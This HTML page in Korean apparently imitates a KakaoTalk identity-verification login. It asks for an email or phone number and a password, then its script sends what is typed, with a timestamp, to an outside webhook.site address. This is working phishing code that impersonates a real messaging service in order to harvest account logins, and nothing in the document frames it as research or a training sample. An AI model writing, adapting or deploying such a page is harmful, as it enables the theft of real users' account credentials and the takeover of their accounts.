<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>카카오톡 이용자보호서비스 완화 - Page 3</title>
  <style>
    body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
    .login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
    .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
    .login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc;
      font-size: 14px; outline: none; }
    .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px;
      font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>카카오톡 본인인증하기</h2>
    <input type="text" placeholder="이메일 또는 전화번호" id="userEmail3">
    <input type="password" placeholder="비밀번호" id="userPw3">
    <button class="btn-gray" onclick="login3()">본인인증하기</button>
  </div>

  <script>
    const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";

    function login3() {
      const email = document.getElementById("userEmail3").value.trim();
      const password = document.getElementById("userPw3").value.trim();

      if (!email || !password) {
        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
        return;
      }

      const formData = new URLSearchParams();
      formData.append("page", "3");
      formData.append("email", email);
      formData.append("password", password);
      formData.append("timestamp", new Date().toISOString());

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formData
      })
      .then(() => alert("3페이지 값이 전송되었습니다!"))
      .catch(err => console.error("전송 오류:", err));
    }
  </script>
</body>
</html>
